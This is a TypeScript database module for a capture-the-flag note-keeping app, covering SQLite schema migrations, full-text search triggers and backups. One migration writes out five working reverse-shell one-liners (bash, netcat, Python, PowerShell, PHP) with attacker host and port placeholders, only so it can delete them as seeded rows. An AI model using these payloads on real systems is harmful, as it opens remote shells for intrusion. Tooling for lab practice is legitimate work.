import Database from 'better-sqlite3'
import { existsSync, mkdirSync, readFileSync, rmSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { PHASES } from '../shared/types'

const PHASE_LIST = PHASES.map((p) => `'${p}'`).join(',')
const schema = readFileSync(join(dirname(fileURLToPath(import.meta.url)), 'schema.sql'), 'utf8').replaceAll('{{PHASES}}', PHASE_LIST)

type Fn = (r: string) => string
type Indexed = [string, string, Fn, Fn, Fn]
// kind, table, title expr, body expr, box_id expr (r = NEW/OLD/alias)
const STEP: Indexed = ['step', 'steps', (r) => `${r}.phase`, (r) => `${r}.body`, (r) => `${r}.box_id`]
// Migration 11: a step's index body also carries its hypothesis-loop lines (TRIM: empty lines would pad the snippet). STEP stays for the older migrations.
const STEP_V2: Indexed = ['step', 'steps', (r) => `${r}.phase`, (r) => `TRIM(${r}.body || ' ' || ${r}.saw || ' ' || ${r}.think || ' ' || ${r}.tried || ' ' || ${r}.got)`, (r) => `${r}.box_id`]
const INDEXED: Indexed[] = [
  ['box', 'boxes', (r) => `${r}.short_id || ' ' || ${r}.name`, (r) => `${r}.os || ' ' || ${r}.tags`, (r) => `${r}.id`],
  STEP,
  ['technique', 'techniques', (r) => `${r}.name`, (r) => `${r}.description`, () => 'NULL'],
  ['tool', 'tools', (r) => `${r}.name`, (r) => `${r}.description`, () => 'NULL'],
  ['command', 'commands', (r) => `${r}.purpose`, (r) => `${r}.template`, () => 'NULL'],
  ['reference', 'reference_pages', (r) => `${r}.title`, (r) => `${r}.body`, () => 'NULL'],
]
const ins = (k: string, r: string, t: Fn, b: Fn, x: Fn) =>
  `INSERT INTO search_index (kind, ref_id, box_id, title, body) VALUES ('${k}', ${r}.id, ${x(r)}, ${t(r)}, ${b(r)});`
// shortcut: ref_id is UNINDEXED, so this scans search_index (~0.5 ms per save at 5.3k rows, measured); key rows by rowid past ~100k rows.
const del = (k: string) => `DELETE FROM search_index WHERE kind = '${k}' AND ref_id = OLD.id;`

const backfill = ([k, tbl, t, b, x]: Indexed, where = '') =>
  `INSERT INTO search_index (kind, ref_id, box_id, title, body) SELECT '${k}', t.id, ${x('t')}, ${t('t')}, ${b('t')} FROM ${tbl} t${where};`
const indexSql = (entries: Indexed[]) => entries.map((e) => {
  const [k, tbl, t, b, x] = e
  return `
CREATE TRIGGER ${tbl}_si_ai AFTER INSERT ON ${tbl} BEGIN ${ins(k, 'NEW', t, b, x)} END;
CREATE TRIGGER ${tbl}_si_au AFTER UPDATE ON ${tbl} BEGIN ${del(k)} ${ins(k, 'NEW', t, b, x)} END;
CREATE TRIGGER ${tbl}_si_ad AFTER DELETE ON ${tbl} BEGIN ${del(k)} END;
${backfill(e)}`
}).join('\n')

const SEARCH_SQL = `
CREATE VIRTUAL TABLE search_index USING fts5(kind UNINDEXED, ref_id UNINDEXED, box_id UNINDEXED, title, body, tokenize='unicode61 remove_diacritics 2');
${indexSql(INDEXED)}
`

// A host's body includes its IPs, which live in host_ips, so IP changes re-index the owning host.
const HOST: Indexed = ['host', 'hosts', (r) => `${r}.name`,
  (r) => `COALESCE((SELECT group_concat(ip, ' ') FROM host_ips WHERE host_id = ${r}.id) || ' ', '') || ${r}.os`, () => 'NULL']
// Never the secret: only username and found_note are searchable.
const CREDENTIAL: Indexed = ['credential', 'credentials', (r) => `${r}.username`, (r) => `${r}.found_note`, (r) => `${r}.box_id`]
const reindexHost = (id: string) => `DELETE FROM search_index WHERE kind = 'host' AND ref_id = ${id}; ${backfill(HOST, ` WHERE t.id = ${id}`)}`

const NETWORKS_SQL = `
CREATE TABLE networks (
  id INTEGER PRIMARY KEY,
  short_id TEXT UNIQUE NOT NULL,
  platform TEXT NOT NULL CHECK (platform IN ('HTB','THM','Other')),
  name TEXT NOT NULL,
  hosts_in_scope INTEGER,
  flags_in_scope INTEGER,
  tags TEXT NOT NULL DEFAULT '[]',
  notes TEXT NOT NULL DEFAULT '',
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE TABLE hosts (
  id INTEGER PRIMARY KEY,
  short_id TEXT UNIQUE NOT NULL,
  network_id INTEGER NOT NULL REFERENCES networks(id) ON DELETE CASCADE,
  name TEXT NOT NULL,
  os TEXT NOT NULL DEFAULT '',
  status TEXT NOT NULL DEFAULT 'not_started' CHECK (status IN ('not_started','in_progress','user_flag','rooted')),
  next_step TEXT NOT NULL DEFAULT '',
  notes TEXT NOT NULL DEFAULT '',
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE TABLE host_ips (
  id INTEGER PRIMARY KEY,
  host_id INTEGER NOT NULL REFERENCES hosts(id) ON DELETE CASCADE,
  ip TEXT NOT NULL,
  is_primary INTEGER NOT NULL DEFAULT 0,
  UNIQUE (host_id, ip)
);
CREATE TABLE subnets (
  id INTEGER PRIMARY KEY,
  network_id INTEGER NOT NULL REFERENCES networks(id) ON DELETE CASCADE,
  cidr TEXT NOT NULL,
  UNIQUE (network_id, cidr)
);
CREATE TABLE pivots (
  id INTEGER PRIMARY KEY,
  from_host_id INTEGER NOT NULL REFERENCES hosts(id) ON DELETE CASCADE,
  subnet_id INTEGER NOT NULL REFERENCES subnets(id) ON DELETE CASCADE,
  method TEXT NOT NULL DEFAULT '',
  note TEXT NOT NULL DEFAULT '',
  UNIQUE (from_host_id, subnet_id)
);
CREATE TABLE credentials (
  id INTEGER PRIMARY KEY,
  network_id INTEGER REFERENCES networks(id) ON DELETE CASCADE,
  box_id INTEGER REFERENCES boxes(id) ON DELETE CASCADE,
  username TEXT NOT NULL DEFAULT '',
  kind TEXT NOT NULL CHECK (kind IN ('password','ntlm','kerberos','ssh_key','other')),
  secret TEXT NOT NULL,
  found_on_host_id INTEGER REFERENCES hosts(id) ON DELETE SET NULL,
  found_note TEXT NOT NULL DEFAULT '',
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  CHECK ((network_id IS NULL) <> (box_id IS NULL))
);
CREATE TABLE credential_results (
  credential_id INTEGER NOT NULL REFERENCES credentials(id) ON DELETE CASCADE,
  host_id INTEGER NOT NULL REFERENCES hosts(id) ON DELETE CASCADE,
  result TEXT NOT NULL CHECK (result IN ('works','failed')),
  PRIMARY KEY (credential_id, host_id)
);
CREATE TABLE flags (
  id INTEGER PRIMARY KEY,
  network_id INTEGER REFERENCES networks(id) ON DELETE CASCADE,
  box_id INTEGER REFERENCES boxes(id) ON DELETE CASCADE,
  host_id INTEGER REFERENCES hosts(id) ON DELETE SET NULL,
  label TEXT NOT NULL DEFAULT '',
  value TEXT NOT NULL,
  captured_at TEXT NOT NULL DEFAULT (datetime('now')),
  CHECK ((network_id IS NULL) <> (box_id IS NULL))
);
ALTER TABLE context ADD COLUMN active_host_id INTEGER REFERENCES hosts(id) ON DELETE SET NULL;
ALTER TABLE context ADD COLUMN active_host_ip TEXT;
INSERT OR IGNORE INTO id_counters (type, next) VALUES ('N', 1), ('HS', 1);

-- SQLite 12-step ALTER: box_id becomes nullable, host_id is added. Ids are kept, so technique_uses stay valid.
CREATE TABLE steps_new (
  id INTEGER PRIMARY KEY,
  box_id INTEGER REFERENCES boxes(id) ON DELETE CASCADE,
  host_id INTEGER REFERENCES hosts(id) ON DELETE CASCADE,
  phase TEXT NOT NULL CHECK (phase IN (${PHASE_LIST})),
  position INTEGER NOT NULL,
  body TEXT NOT NULL DEFAULT '',
  seconds INTEGER NOT NULL DEFAULT 0,
  timer_started_at INTEGER,
  CHECK ((box_id IS NULL) <> (host_id IS NULL))
);
INSERT INTO steps_new (id, box_id, host_id, phase, position, body, seconds, timer_started_at)
  SELECT id, box_id, NULL, phase, position, body, seconds, timer_started_at FROM steps;
DROP TABLE steps;
ALTER TABLE steps_new RENAME TO steps;
-- DROP TABLE took the steps triggers but left their search rows; rebuild both.
DELETE FROM search_index WHERE kind = 'step';
${indexSql([STEP, HOST, CREDENTIAL])}
CREATE TRIGGER host_ips_si_ai AFTER INSERT ON host_ips BEGIN ${reindexHost('NEW.host_id')} END;
CREATE TRIGGER host_ips_si_au AFTER UPDATE ON host_ips BEGIN ${reindexHost('OLD.host_id')} ${reindexHost('NEW.host_id')} END;
CREATE TRIGGER host_ips_si_ad AFTER DELETE ON host_ips BEGIN ${reindexHost('OLD.host_id')} END;
`

// Networks are searchable (spec section 7); tags are the body, as for boxes.
const NETWORK: Indexed = ['network', 'networks', (r) => `${r}.short_id || ' ' || ${r}.name`, (r) => `${r}.tags`, () => 'NULL']

// Migration 5: tags are stored as JSON; index them as "a, b" so search snippets read as text.
// COALESCE: group_concat over '[]' is NULL, which would null out the whole body.
const tagText = (r: string) => `COALESCE((SELECT group_concat(value, ', ') FROM json_each(${r}.tags)), '')`
const BOX_TAGS: Indexed = ['box', 'boxes', INDEXED[0][2], (r) => `TRIM(${r}.os || ' ' || ${tagText(r)})`, INDEXED[0][4]]
const NETWORK_TAGS: Indexed = ['network', 'networks', NETWORK[2], tagText, NETWORK[4]]
const dropIndex = (tbl: string) => `DROP TRIGGER ${tbl}_si_ai; DROP TRIGGER ${tbl}_si_au; DROP TRIGGER ${tbl}_si_ad;`

// Migration 6: re-index a row only when a column the index reads is in the UPDATE, so timer ticks, reorders and
// status changes stop rewriting FTS rows. Built from the current (v5) definitions; the update triggers are the only change.
const UPDATE_OF: [Indexed, string[]][] = [
  [BOX_TAGS, ['short_id', 'name', 'os', 'tags']],
  [STEP, ['phase', 'body', 'box_id']],
  [INDEXED[2], ['name', 'description']],
  [INDEXED[3], ['name', 'description']],
  [INDEXED[4], ['purpose', 'template']],
  [INDEXED[5], ['title', 'body']],
  [HOST, ['name', 'os']],
  [CREDENTIAL, ['username', 'found_note', 'box_id']],
  [NETWORK_TAGS, ['short_id', 'name', 'tags']],
]
const SCOPED_UPDATES = `${UPDATE_OF.map(([[k, tbl, t, b, x], cols]) => `DROP TRIGGER ${tbl}_si_au;
CREATE TRIGGER ${tbl}_si_au AFTER UPDATE OF ${cols.join(', ')} ON ${tbl} BEGIN ${del(k)} ${ins(k, 'NEW', t, b, x)} END;`).join('\n')}
DROP TRIGGER host_ips_si_au;
CREATE TRIGGER host_ips_si_au AFTER UPDATE OF ip, host_id ON host_ips BEGIN ${reindexHost('OLD.host_id')} ${reindexHost('NEW.host_id')} END;`

/** Ordered; entry i upgrades user_version i -> i+1. schema.sql stays the v0 baseline.
 *  foreignKeysOff is for table rebuilds: the pragma can't change inside a transaction, so the runner sets it around one. */
export const MIGRATIONS: (string | { sql: string; foreignKeysOff: true })[] = [
  `ALTER TABLE boxes ADD COLUMN release_date TEXT;
ALTER TABLE boxes ADD COLUMN source TEXT NOT NULL DEFAULT 'manual';${SEARCH_SQL}`,
  `CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT NOT NULL);`,
  { sql: NETWORKS_SQL, foreignKeysOff: true },
  indexSql([NETWORK]),
  `${dropIndex('boxes')} ${dropIndex('networks')}
DELETE FROM search_index WHERE kind IN ('box', 'network');
${indexSql([BOX_TAGS, NETWORK_TAGS])}`,
  SCOPED_UPDATES,
  `CREATE INDEX steps_box ON steps(box_id); CREATE INDEX steps_host ON steps(host_id);`,
  // the reverse-shell seed is gone: drop untouched seeded rows, keep anything the owner edited, added or linked
  `DELETE FROM commands WHERE source_id = 'seed:revshell:bash' AND template = 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1';
DELETE FROM commands WHERE source_id = 'seed:revshell:nc-mkfifo' AND template = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f';
DELETE FROM commands WHERE source_id = 'seed:revshell:python3' AND template = 'python3 -c ''import socket,os,pty;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")''';
DELETE FROM commands WHERE source_id = 'seed:revshell:powershell' AND template = 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(''{{LHOST}}'',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o+''PS> '');$s.Write($e,0,$e.Length)}"';
DELETE FROM commands WHERE source_id = 'seed:revshell:php' AND template = 'php -r ''$s=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");''';
UPDATE commands SET source_id = NULL WHERE source_id LIKE 'seed:revshell:%';
DELETE FROM meta WHERE key = 'seed:reverse-shells';
DELETE FROM tools WHERE source_id = 'seed:tool:reverse-shells' AND name = 'Reverse shells' AND NOT EXISTS (SELECT 1 FROM commands WHERE tool_id = tools.id) AND NOT EXISTS (SELECT 1 FROM technique_tools WHERE tool_id = tools.id);`,
  // a step can be ticked off; the first unticked one is the current step
  `ALTER TABLE steps ADD COLUMN done INTEGER NOT NULL DEFAULT 0;`,
  // writeup report summary fields
  `ALTER TABLE boxes ADD COLUMN foothold TEXT NOT NULL DEFAULT '';
ALTER TABLE boxes ADD COLUMN privesc TEXT NOT NULL DEFAULT '';
ALTER TABLE boxes ADD COLUMN rating TEXT NOT NULL DEFAULT '';
ALTER TABLE hosts ADD COLUMN foothold TEXT NOT NULL DEFAULT '';
ALTER TABLE hosts ADD COLUMN privesc TEXT NOT NULL DEFAULT '';
ALTER TABLE hosts ADD COLUMN rating TEXT NOT NULL DEFAULT '';`,
  // hypothesis loop: four one-line fields and a dead flag; the step index reads the lines, Done and timers still don't reindex
  `ALTER TABLE steps ADD COLUMN saw TEXT NOT NULL DEFAULT '';
ALTER TABLE steps ADD COLUMN think TEXT NOT NULL DEFAULT '';
ALTER TABLE steps ADD COLUMN tried TEXT NOT NULL DEFAULT '';
ALTER TABLE steps ADD COLUMN got TEXT NOT NULL DEFAULT '';
ALTER TABLE steps ADD COLUMN dead INTEGER NOT NULL DEFAULT 0;
${dropIndex('steps')}
DELETE FROM search_index WHERE kind = 'step';
${indexSql([STEP_V2])}
DROP TRIGGER steps_si_au;
CREATE TRIGGER steps_si_au AFTER UPDATE OF phase, body, box_id, saw, think, tried, got ON steps BEGIN ${del('step')} ${ins('step', 'NEW', STEP_V2[2], STEP_V2[3], STEP_V2[4])} END;`,
  // toolbox rows: owner-set order within a phase and an applies-to; today's rows keep their name order (id breaks a name tie).
  // No CHECK on applies (ALTER can't add one): the routes validate it.
  `ALTER TABLE techniques ADD COLUMN position INTEGER NOT NULL DEFAULT 0;
ALTER TABLE techniques ADD COLUMN applies TEXT NOT NULL DEFAULT 'any';
UPDATE techniques SET position = (SELECT COUNT(*) + 1 FROM techniques b WHERE b.phase = techniques.phase AND (b.name COLLATE NOCASE < techniques.name COLLATE NOCASE OR (b.name COLLATE NOCASE = techniques.name COLLATE NOCASE AND b.id < techniques.id)));`,
  // a box's DNS name, for commands that want a hostname ({{DNS}})
  `ALTER TABLE boxes ADD COLUMN dns TEXT NOT NULL DEFAULT '';`,
  // service shelf: a technique's service and needs/yields (JSON arrays of Have), a command's intent, a box's or host's services and haves.
  // Not indexed; no backfill.
  `ALTER TABLE techniques ADD COLUMN service TEXT NOT NULL DEFAULT 'any';
ALTER TABLE techniques ADD COLUMN needs TEXT NOT NULL DEFAULT '[]';
ALTER TABLE techniques ADD COLUMN yields TEXT NOT NULL DEFAULT '[]';
ALTER TABLE commands ADD COLUMN intent TEXT NOT NULL DEFAULT '';
ALTER TABLE boxes ADD COLUMN services TEXT NOT NULL DEFAULT '[]';
ALTER TABLE boxes ADD COLUMN haves TEXT NOT NULL DEFAULT '[]';
ALTER TABLE hosts ADD COLUMN services TEXT NOT NULL DEFAULT '[]';
ALTER TABLE hosts ADD COLUMN haves TEXT NOT NULL DEFAULT '[]';`,
  // a box's platform page; imported boxes get it from their source id, manual ones type it
  `ALTER TABLE boxes ADD COLUMN url TEXT NOT NULL DEFAULT '';
UPDATE boxes SET url = 'https://app.hackthebox.com/machines/' || substr(source_id, 5) WHERE source_id LIKE 'htb:%';
UPDATE boxes SET url = 'https://tryhackme.com/room/' || substr(source_id, 5) WHERE source_id LIKE 'thm:%';`,
  // networks learn where they came from (preset or platform import) and their platform page
  `ALTER TABLE networks ADD COLUMN source_id TEXT;
CREATE UNIQUE INDEX networks_source ON networks(source_id);
ALTER TABLE networks ADD COLUMN url TEXT NOT NULL DEFAULT '';`,
  // a box credential's Works on: the services (JSON array of SERVICES slugs) it logs in to; network credentials use credential_results per host
  `ALTER TABLE credentials ADD COLUMN works_on TEXT NOT NULL DEFAULT '[]';`,
  `ALTER TABLE networks ADD COLUMN entry TEXT NOT NULL DEFAULT '';`,
  // the cascades and library lists filtered these foreign keys by full scan
  `CREATE INDEX technique_uses_step ON technique_uses(step_id);
CREATE INDEX commands_technique ON commands(technique_id);
CREATE INDEX commands_tool ON commands(tool_id);`,
  // step screenshots live in the db so a backup is one file
  `CREATE TABLE attachments (
  id INTEGER PRIMARY KEY,
  key TEXT UNIQUE NOT NULL,
  step_id INTEGER NOT NULL REFERENCES steps(id) ON DELETE CASCADE,
  name TEXT NOT NULL,
  mime TEXT NOT NULL,
  size INTEGER NOT NULL,
  data BLOB NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX attachments_step ON attachments(step_id);`,
]

export function openDb(file: string): Database.Database {
  if (file !== ':memory:') mkdirSync(dirname(file), { recursive: true })
  const db = new Database(file)
  try {
    db.pragma('journal_mode = WAL')
    db.pragma('foreign_keys = ON')
    // Importers match hand-made boxes by name: case, outer and repeated inner whitespace don't count. Not for triggers/indexes.
    db.function('norm_name', { deterministic: true }, (s: unknown) => (typeof s === 'string' ? s.replace(/\s+/g, ' ').trim().toLowerCase() : s))
    const v = db.pragma('user_version', { simple: true }) as number
    if (v > MIGRATIONS.length) throw new Error(`database is v${v}, this SlingSh0t knows v${MIGRATIONS.length}; update the app`)
    // Copy an existing file db before migrating it (a brand-new file has no tables and nothing to lose).
    // Sync VACUUM INTO, not backupDb: openDb is synchronous and db.backup() is async.
    if (file !== ':memory:' && v < MIGRATIONS.length && db.prepare('SELECT 1 FROM sqlite_master').get()) {
      const dir = join(dirname(file), 'backups')
      mkdirSync(dir, { recursive: true })
      const copy = freePath(dir, `pre-migration-v${v}-${stamp(new Date())}`)
      try { db.prepare('VACUUM INTO ?').run(copy) } catch (e) { rmSync(copy, { force: true }); throw e } // a partial copy is no backup
    }
    type Violation = { table: string; rowid: number; parent: string }
    const violations = () => (db.pragma('foreign_key_check') as Violation[]).map((r) => `${r.table} row ${r.rowid} -> ${r.parent}`) // no fkid: a table rebuild renumbers it
    db.exec(schema)
    MIGRATIONS.slice(v).forEach((m, i) => {
      const fkOff = typeof m !== 'string'
      if (fkOff) db.pragma('foreign_keys = OFF')
      try {
        db.transaction(() => {
          // Only what this migration broke counts: an old dangling row (the backup has it too) must not block every start.
          const before = new Set(fkOff ? violations() : [])
          db.exec(fkOff ? m.sql : m)
          if (fkOff) {
            const bad = violations().filter((x) => !before.has(x))
            if (bad.length) throw new Error(`migration ${v + i + 1} broke foreign keys: ${bad.join(', ')}`)
          }
          db.pragma(`user_version = ${v + i + 1}`)
        })()
      } finally {
        if (fkOff) db.pragma('foreign_keys = ON')
      }
    })
  } catch (e) {
    db.close() // release the file (Windows keeps it locked) before reporting
    throw e
  }
  return db
}

const p2 = (n: number) => String(n).padStart(2, '0')
const stamp = (now: Date) => `${now.getFullYear()}${p2(now.getMonth() + 1)}${p2(now.getDate())}-${p2(now.getHours())}${p2(now.getMinutes())}${p2(now.getSeconds())}`
// Two backups in the same second get -2, -3… instead of overwriting (or, for VACUUM INTO, failing on) the first.
const freePath = (dir: string, base: string) => {
  let path = join(dir, `${base}.db`)
  for (let n = 2; existsSync(path); n++) path = join(dir, `${base}-${n}.db`)
  return path
}

export async function backupDb(db: Database.Database, dir: string, now = new Date()): Promise<string> {
  mkdirSync(dir, { recursive: true })
  const path = freePath(dir, `slingsh0t-${stamp(now)}`)
  await db.backup(path)
  return path
}

/** UPDATE `table` SET each key of `set`; table and keys are code literals, never user input. No-op when `set` is empty. */
export function updateRow(db: Database.Database, table: string, id: number, set: Record<string, unknown>): void {
  const cols = Object.keys(set)
  if (cols.length) db.prepare(`UPDATE ${table} SET ${cols.map((c) => `${c} = ?`).join(', ')} WHERE id = ?`).run(...Object.values(set), id)
}
